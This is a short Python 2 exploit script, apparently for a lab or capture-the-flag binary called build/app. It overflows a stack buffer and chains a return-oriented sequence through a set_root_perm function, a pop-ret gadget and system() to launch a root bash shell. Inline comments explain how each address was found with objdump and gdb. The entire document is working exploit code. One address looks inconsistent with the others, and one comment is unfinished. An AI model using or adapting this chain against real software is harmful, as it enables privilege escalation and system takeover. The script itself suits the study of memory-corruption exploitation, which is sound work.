#!/usr/bin/python2

import os
import struct

# These values were found with.
system = 0x8049080  # `objdump -d build/app | grep system`
bash_cmd = 0x804a00c  # `gdb -q build/app` then `p bash_cmd`
set_root_perm = 0x90491ff  # `objdump -d build/app | grep set_root_perm`
pop_ret = 0x80492e6  # `objdump -d build/app` find pop then ret in _fini
pop_data = 0x11111111  # random data

# First, the buffer overflow.
payload = "A"*0x70
payload += "BBBB"

# Choose which function to call
payload += struct.pack("I", set_root_perm)
# Pop ret to get data from stack
payload += struct.pack("I", pop_ret)
# Write data
payload += struct.pack("I", pop_data)

# Use system function to start bash
payload += struct.pack("I", system)
# Fake return address
payload += "CCCC"
# Use unused variable to run
payload += struct.pack("I", bash_cmd)

# Pass all payload data to the binary
print(payload)
# os.system("./build/app '{}'".format(payload))
